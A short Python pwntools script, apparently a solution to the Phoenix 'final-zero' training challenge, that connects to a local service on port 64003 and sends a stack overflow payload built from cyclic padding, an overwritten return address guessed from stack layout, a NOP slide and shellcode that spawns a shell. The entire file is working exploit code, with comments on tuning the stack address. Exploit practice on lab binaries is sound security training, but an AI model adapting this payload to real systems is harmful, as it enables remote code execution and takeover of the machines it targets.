#!/usr/bin/env python3
from pwn import *

# context.log_level = "debug"
elf = context.binary = "/opt/phoenix/amd64/final-zero"
context.arch = "amd64"

r = remote("127.0.0.1", 64003)
# local env uses ~3400 extra bytes (0xd48) due to vsc, ssh, pyenv, etc
# local stack address ends in 0xdf00
# 0xdf00 + 0xd48 = 0xec48; works after adding some nop slide
stack = 0x00007FFFFFFFED00
offset = cyclic_find(0x6661616E)
payload = (
    b"\x00" + cyclic(offset - 1) + pack(stack) + b"\x90" * 0x200 + asm(shellcraft.sh())
)
r.sendline(payload)
r.interactive()
